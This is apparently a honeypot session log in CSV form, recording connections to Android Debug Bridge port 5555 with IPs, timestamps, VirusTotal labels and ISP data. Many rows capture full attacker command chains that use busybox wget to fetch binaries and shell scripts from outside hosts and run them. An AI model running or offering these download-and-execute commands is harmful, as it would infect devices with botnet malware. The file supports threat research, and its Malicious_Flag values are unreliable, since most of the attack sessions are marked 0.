session_id,Anon Src IP,src_port,Dst IP,dest_port,start_time,end_time,duration,sensor,commands,VT Labels,VT Reputation,Geo Location,ISP,Malicious_Flag
8fb82b67b2c0,124.211.11.175,50690,172.26.0.2,5555,2025-03-10T07:29:42.332484Z,2025-03-10T07:30:28.071513Z,45.74,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
124ea675ec32,108.90.122.115,63372,172.26.0.2,5555,2025-03-10T07:59:48.047504Z,2025-03-10T08:04:48.101522Z,300.05,honeypot01,,"malicious, phishing",0,FI,AS396982 Google LLC,0
6dfd86043c43,124.211.11.175,49224,172.26.0.2,5555,2025-03-10T08:44:24.200488Z,2025-03-10T08:45:10.068016Z,45.87,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
b6ed99239d0f,93.154.187.208,53680,172.26.0.2,5555,2025-03-10T12:17:03.401428Z,2025-03-10T12:22:03.557417Z,300.16,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
ec4863bad5a7,93.154.187.208,37648,172.26.0.2,5555,2025-03-10T12:17:21.513788Z,2025-03-10T12:22:21.691745Z,300.18,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
a4a68e983271,93.154.187.208,50620,172.26.0.2,5555,2025-03-10T12:17:31.608676Z,2025-03-10T12:22:31.792033Z,300.18,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
cca488405cb6,93.154.187.208,57072,172.26.0.2,5555,2025-03-10T12:17:41.710161Z,2025-03-10T12:22:41.893274Z,300.18,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
6509dae0cc9a,93.154.187.208,54000,172.26.0.2,5555,2025-03-10T12:17:51.820388Z,2025-03-10T12:22:51.987018Z,300.17,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
15e34bfbcbe2,93.154.187.208,44552,172.26.0.2,5555,2025-03-10T12:18:01.917542Z,2025-03-10T12:23:02.083357Z,300.17,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
6aed3cbde68b,93.154.187.208,58588,172.26.0.2,5555,2025-03-10T12:18:20.240674Z,2025-03-10T12:23:20.397779Z,300.16,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
7abb463ae760,93.154.187.208,37112,172.26.0.2,5555,2025-03-10T12:18:40.349604Z,2025-03-10T12:23:40.533150Z,300.18,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
91a45c06ea57,93.154.187.208,33088,172.26.0.2,5555,2025-03-10T12:18:50.459179Z,2025-03-10T12:23:50.619498Z,300.16,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
d74986d04391,93.154.187.208,54426,172.26.0.2,5555,2025-03-10T12:19:00.557052Z,2025-03-10T12:24:00.732045Z,300.18,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
6de2f38a9810,93.154.187.208,42770,172.26.0.2,5555,2025-03-10T12:19:24.180994Z,2025-03-10T12:24:24.366817Z,300.19,honeypot01,,"malicious, malware, phishing",0,DE,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
f89817bdf24e,76.69.240.77,50316,172.26.0.2,5555,2025-03-10T16:25:13.569760Z,2025-03-10T16:30:13.747688Z,300.18,honeypot01,,"malicious, malware",0,DE,,0
522ffa0e7063,124.211.11.175,58468,172.26.0.2,5555,2025-03-10T19:09:23.320364Z,2025-03-10T19:09:53.862173Z,30.54,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
c4c9965f5789,124.211.11.175,47812,172.26.0.2,5555,2025-03-10T19:50:25.575369Z,2025-03-10T19:51:14.959044Z,49.38,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
7629e02d3524,108.90.122.17,61860,172.26.0.2,5555,2025-03-11T01:12:13.594439Z,2025-03-11T01:17:13.642942Z,300.05,honeypot01,,"malicious, phishing",-1,FI,AS396982 Google LLC,0
37b4634c80ca,12.47.16.164,61588,172.18.0.2,5555,2025-03-27T06:35:16.841620Z,2025-03-27T06:40:16.987332Z,300.15,honeypot01,,"malicious, phishing, malware",-5,US,AS396982 Google LLC,0
a0950a9d778e,12.47.16.164,64868,172.18.0.2,5555,2025-03-27T06:35:28.906314Z,2025-03-27T06:40:29.004610Z,300.1,honeypot01,,"malicious, phishing, malware",-5,US,AS396982 Google LLC,0
a9c1d903b73d,133.94.131.216,38553,172.18.0.2,5555,2025-03-27T07:31:03.753558Z,2025-03-27T07:36:03.801172Z,300.05,honeypot01,,"malicious, malware, phishing",-3,US,AS6939 Hurricane Electric LLC,0
5f161ba63e67,171.206.111.210,38472,172.18.0.2,5555,2025-03-27T16:12:40.714210Z,2025-03-27T16:17:40.762041Z,300.05,honeypot01,,,0,IN,AS9829 National Internet Backbone,0
50e698304257,211.112.26.69,36054,172.18.0.2,5555,2025-03-27T17:05:09.487788Z,2025-03-27T17:05:55.130983Z,45.64,honeypot01,cd /data/local/tmp/; busybox wget http://103.142.27.125/w.sh; sh w.sh; curl http://103.142.27.125/c.sh; sh c.sh,"malicious, malware",0,VN,AS131414 Long Van Soft Solution JSC,0
c2b66e43b16d,5.59.92.75,51100,172.18.0.2,5555,2025-03-27T20:30:44.404463Z,2025-03-27T20:31:30.056715Z,45.65,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",0,NL,AS401120 cheapy.host LLC,0
29fef27132ab,69.234.218.2,49574,172.18.0.2,5555,2025-03-28T01:44:34.421706Z,2025-03-28T01:49:34.717698Z,300.3,honeypot01,,"malware, phishing, malicious",-1,NL,AS202425 IP Volume inc,0
ec7ecdcffd7c,69.234.218.2,60830,172.18.0.2,5555,2025-03-28T01:46:44.790804Z,2025-03-28T01:51:44.954193Z,300.16,honeypot01,,"malware, phishing, malicious",-1,NL,AS202425 IP Volume inc,0
bc8791307b3f,124.211.11.210,42904,172.18.0.2,5555,2025-03-28T01:49:55.753552Z,2025-03-28T01:50:41.122379Z,45.37,honeypot01,cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,"malicious, phishing",-3,LT,AS209605 UAB Host Baltic,0
fe8a9b263fce,144.154.157.178,51520,172.18.0.2,5555,2025-03-28T01:59:54.740766Z,2025-03-28T02:00:40.091232Z,45.35,honeypot01,cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,"malicious, malware",-1,NL,AS215925 VPSVAULT.HOST LTD,0
be27b7f20209,124.211.11.210,55712,172.18.0.2,5555,2025-03-28T03:08:58.388086Z,2025-03-28T03:09:44.070413Z,45.68,honeypot01,cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,"malicious, phishing",-3,LT,AS209605 UAB Host Baltic,0
38f5bfa1c6f5,124.211.11.175,58962,192.168.96.2,5555,2025-03-09T05:09:04.656427Z,2025-03-09T05:09:50.061740Z,45.41,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
3204feb3ae43,5.59.92.75,51866,192.168.96.2,5555,2025-03-09T07:21:51.270105Z,2025-03-09T07:26:52.077630Z,300.81,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",0,NL,AS401120 cheapy.host LLC,0
0f023dac247e,76.69.240.77,55422,192.168.96.2,5555,2025-03-09T09:55:30.194615Z,2025-03-09T10:00:30.397991Z,300.2,honeypot01,,"malicious, malware",0,DE,,0
e40602423bec,180.216.154.177,33240,192.168.96.2,5555,2025-03-09T10:25:51.318956Z,2025-03-09T10:30:51.365135Z,300.05,honeypot01,,"malicious, malware, phishing",-11,US,"AS14061 DigitalOcean, LLC",0
727e92b4803b,180.216.154.177,60958,192.168.96.2,5555,2025-03-09T10:26:01.417782Z,2025-03-09T10:31:01.559029Z,300.14,honeypot01,,"malicious, malware, phishing",-11,US,"AS14061 DigitalOcean, LLC",0
0b73ee4d5830,180.216.154.177,55162,192.168.96.2,5555,2025-03-09T10:26:11.421667Z,2025-03-09T10:31:11.600653Z,300.18,honeypot01,,"malicious, malware, phishing",-11,US,"AS14061 DigitalOcean, LLC",0
7cffa7ec8a27,180.216.154.177,37844,192.168.96.2,5555,2025-03-09T10:26:21.421029Z,2025-03-09T10:31:21.585579Z,300.16,honeypot01,,"malicious, malware, phishing",-11,US,"AS14061 DigitalOcean, LLC",0
e995c42bc936,180.216.154.177,46634,192.168.96.2,5555,2025-03-09T10:26:31.420378Z,2025-03-09T10:31:31.598414Z,300.18,honeypot01,,"malicious, malware, phishing",-11,US,"AS14061 DigitalOcean, LLC",0
1b036bc29e35,180.216.154.177,36676,192.168.96.2,5555,2025-03-09T10:26:41.419821Z,2025-03-09T10:31:41.593361Z,300.17,honeypot01,,"malicious, malware, phishing",-11,US,"AS14061 DigitalOcean, LLC",0
f8eede513395,18.18.97.248,47404,192.168.96.2,5555,2025-03-09T12:55:07.321290Z,2025-03-09T13:00:07.541846Z,300.22,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
c63987391996,133.94.131.146,64930,192.168.96.2,5555,2025-03-09T15:51:25.459803Z,2025-03-09T15:56:25.623114Z,300.16,honeypot01,,"malicious, phishing, malware",-4,US,AS6939 Hurricane Electric LLC,0
9de39eadf604,5.59.92.75,51952,192.168.96.2,5555,2025-03-09T17:26:03.672574Z,2025-03-09T17:26:49.055285Z,45.38,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",0,NL,AS401120 cheapy.host LLC,0
40fcf3e4cf12,12.47.16.118,57558,192.168.96.2,5555,2025-03-10T00:02:14.200459Z,2025-03-10T00:07:14.357065Z,300.16,honeypot01,,"malicious, malware, phishing",-3,BR,AS396982 Google LLC,0
490a8deb298a,12.47.16.118,65366,192.168.96.2,5555,2025-03-10T00:02:24.202621Z,2025-03-10T00:07:24.366562Z,300.16,honeypot01,,"malicious, malware, phishing",-3,BR,AS396982 Google LLC,0
005f787c362c,69.234.218.2,33420,192.168.96.2,5555,2025-03-10T02:24:58.539202Z,2025-03-10T02:29:58.614723Z,300.08,honeypot01,,"malware, phishing, malicious",-1,NL,AS202425 IP Volume inc,0
c57bb2f2b49a,133.94.131.182,22756,192.168.96.2,5555,2025-03-10T02:32:44.425142Z,2025-03-10T02:37:44.652783Z,300.23,honeypot01,,"malicious, phishing, malware",-17,US,AS6939 Hurricane Electric LLC,0
7e5e4c33ea27,234.34.135.226,37500,172.28.0.2,5555,2025-03-08T04:20:37.351886Z,2025-03-08T04:25:37.393427Z,300.04,honeypot01,,"malware, malicious",0,US,AS8075 Microsoft Corporation,0
56936a5f2102,124.211.11.175,57510,172.28.0.2,5555,2025-03-08T07:40:44.431595Z,2025-03-08T07:41:30.055329Z,45.62,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
4140b1e14560,128.255.1.230,54166,172.28.0.2,5555,2025-03-08T14:34:06.381813Z,2025-03-08T14:39:06.568490Z,300.19,honeypot01,,"malicious, phishing, malware",-55,US,"AS10439 CariNet, Inc.",1
37fa0a498f8f,128.255.1.230,53634,172.28.0.2,5555,2025-03-08T14:50:24.607479Z,2025-03-08T14:55:24.798442Z,300.19,honeypot01,,"malicious, phishing, malware",-55,US,"AS10439 CariNet, Inc.",1
265168f59f86,191.151.86.48,64644,172.28.0.2,5555,2025-03-08T15:29:02.214804Z,2025-03-08T15:29:14.494712Z,12.28,honeypot01,,"malicious, malware",-1,VN,AS135905 VIETNAM POSTS AND TELECOMMUNICATIONS GROUP,0
13f9a4d63256,191.151.86.48,64684,172.28.0.2,5555,2025-03-08T15:52:06.187500Z,2025-03-08T15:52:38.408264Z,32.22,honeypot01,,"malicious, malware",-1,VN,AS135905 VIETNAM POSTS AND TELECOMMUNICATIONS GROUP,0
5d83692ae763,204.46.185.216,52748,172.28.0.2,5555,2025-03-08T17:55:28.239451Z,2025-03-08T18:00:28.538410Z,300.3,honeypot01,,"malicious, malware",0,CN,AS135629 Ningxia West Cloud Data Technology Co.Ltd.,0
23907966669a,124.211.11.175,58802,172.28.0.2,5555,2025-03-08T18:11:17.880714Z,2025-03-08T18:12:03.071764Z,45.19,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
9ab2b5b69557,0.89.205.126,43302,172.28.0.2,5555,2025-03-08T19:16:27.590444Z,2025-03-08T19:21:27.775058Z,300.19,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
5f6743bcd36b,0.89.205.126,43584,172.28.0.2,5555,2025-03-08T19:16:27.692345Z,2025-03-08T19:21:27.874723Z,300.18,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
12edc642acc2,0.89.205.126,39060,172.28.0.2,5555,2025-03-08T19:16:37.811246Z,2025-03-08T19:21:37.834492Z,300.02,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
2ce69636fb9f,0.89.205.126,35988,172.28.0.2,5555,2025-03-08T19:16:48.971977Z,2025-03-08T19:21:49.160962Z,300.19,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
7f2c03bf67d5,0.89.205.126,34962,172.28.0.2,5555,2025-03-08T19:16:59.079282Z,2025-03-08T19:21:59.272076Z,300.19,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
4f6094c4f24f,0.89.205.126,58460,172.28.0.2,5555,2025-03-08T19:17:09.214820Z,2025-03-08T19:22:09.264682Z,300.05,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
d066a5370f9d,0.89.205.126,54696,172.28.0.2,5555,2025-03-08T19:17:19.379679Z,2025-03-08T19:22:19.565717Z,300.19,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
9461cab705f3,0.89.205.126,51560,172.28.0.2,5555,2025-03-08T19:17:29.495786Z,2025-03-08T19:22:29.688758Z,300.19,honeypot01,,"malicious, malware, phishing",-37,NL,"AS41608 NextGenWebs, S.L.",0
8656e9558fe0,99.34.63.240,45268,172.28.0.2,5555,2025-03-08T20:09:10.049410Z,2025-03-08T20:14:10.059064Z,300.01,honeypot01,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
0f376672ca51,76.69.240.77,32938,172.28.0.2,5555,2025-03-08T22:20:48.816517Z,2025-03-08T22:25:49.053178Z,300.24,honeypot01,,"malicious, malware",0,DE,,0
bd61465ba5eb,124.211.11.175,52020,172.28.0.2,5555,2025-03-09T03:40:55.585842Z,2025-03-09T03:41:41.841219Z,46.26,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
db6883953b3e,18.18.97.248,49446,172.18.0.2,5555,2025-03-07T09:03:44.065149Z,2025-03-07T09:08:44.318101Z,300.25,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
7c029e5edd4b,124.211.11.175,57632,172.18.0.2,5555,2025-03-07T09:32:54.038964Z,2025-03-07T09:33:39.065924Z,45.03,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
1779b1585734,124.211.11.175,37532,172.18.0.2,5555,2025-03-07T10:28:33.047374Z,2025-03-07T10:29:18.070782Z,45.02,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
cab51be8e15b,124.211.11.175,53992,172.18.0.2,5555,2025-03-07T12:34:45.517788Z,2025-03-07T12:35:31.066780Z,45.55,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
24076e120f90,133.94.237.52,48687,172.18.0.2,5555,2025-03-07T13:07:03.143421Z,2025-03-07T13:12:03.287569Z,300.14,honeypot01,,"malicious, malware, phishing",-2,US,AS6939 Hurricane Electric LLC,0
1d59aba7d4bc,188.219.103.109,60880,172.18.0.2,5555,2025-03-07T13:52:34.471854Z,2025-03-07T13:57:34.663081Z,300.19,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
b4701f03e8da,188.219.103.109,33894,172.18.0.2,5555,2025-03-07T13:52:43.618326Z,2025-03-07T13:57:43.659161Z,300.04,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
07b293324d13,188.219.103.109,35250,172.18.0.2,5555,2025-03-07T13:52:52.785529Z,2025-03-07T13:57:52.979990Z,300.19,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
d04be27b8721,188.219.103.109,36614,172.18.0.2,5555,2025-03-07T13:53:01.895212Z,2025-03-07T13:58:01.897342Z,300.0,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
e12ccd5fb5e6,188.219.103.109,37946,172.18.0.2,5555,2025-03-07T13:53:11.027302Z,2025-03-07T13:58:11.034248Z,300.01,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
e9bd103f3ffc,188.219.103.109,39300,172.18.0.2,5555,2025-03-07T13:53:20.141536Z,2025-03-07T13:58:20.340072Z,300.2,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
19d36943a40a,188.219.103.109,40908,172.18.0.2,5555,2025-03-07T13:53:29.270144Z,2025-03-07T13:58:29.464411Z,300.2,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
cf9900ba9d96,188.219.103.109,42212,172.18.0.2,5555,2025-03-07T13:53:38.394441Z,2025-03-07T13:58:38.602119Z,300.21,honeypot01,,"malicious, phishing, malware",-1,GB,AS135377 UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED,0
5d9b883e1996,76.69.240.77,53980,172.18.0.2,5555,2025-03-07T16:59:34.118528Z,2025-03-07T17:04:34.295203Z,300.18,honeypot01,,"malicious, malware",0,DE,,0
8f91e2529275,124.211.11.175,60272,172.18.0.2,5555,2025-03-07T18:25:24.777112Z,2025-03-07T18:26:10.139586Z,45.36,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
31f2418a1319,124.211.11.175,55098,172.18.0.2,5555,2025-03-07T19:24:48.016631Z,2025-03-07T19:25:35.065656Z,47.05,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
71a8a4d7493b,124.211.11.175,37940,172.18.0.2,5555,2025-03-07T19:37:49.970530Z,2025-03-07T19:38:36.567733Z,46.6,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb,"phishing, malicious, malware",-5,LT,AS209605 UAB Host Baltic,0
802eaab80513,166.208.135.31,52256,172.18.0.2,5555,2025-03-07T20:43:30.605992Z,2025-03-07T20:48:30.797095Z,300.19,honeypot01,,,0,CN,AS24547 Hebei Mobile Communication Company Limited,0
7e8d4425239e,147.209.227.148,55085,172.18.0.2,5555,2025-03-07T21:09:46.229566Z,2025-03-07T21:14:46.234310Z,300.0,honeypot01,,,-2,DE,AS8560 IONOS SE,0
8dcc91a82251,18.18.97.248,36458,172.18.0.2,5555,2025-03-07T23:01:38.395786Z,2025-03-07T23:06:38.656684Z,300.26,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
2457ba707203,108.90.123.62,62480,172.18.0.2,5555,2025-03-08T01:59:16.817646Z,2025-03-08T02:04:16.880735Z,300.06,honeypot01,,"malicious, phishing, malware",-4,US,AS396982 Google LLC,0
d9fe450bb596,108.90.123.62,61024,172.18.0.2,5555,2025-03-08T01:59:26.817467Z,2025-03-08T02:04:26.893449Z,300.08,honeypot01,,"malicious, phishing, malware",-4,US,AS396982 Google LLC,0
09e77f17e300,186.126.138.102,15370,172.18.0.2,5555,2025-03-08T02:48:28.854510Z,2025-03-08T02:53:29.054805Z,300.2,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
057ddd0be947,186.126.138.102,61582,172.18.0.2,5555,2025-03-08T02:48:39.887464Z,2025-03-08T02:53:40.082676Z,300.2,honeypot01,,"malicious, malware",-1,US,AS63949 Akamai Connected Cloud,0
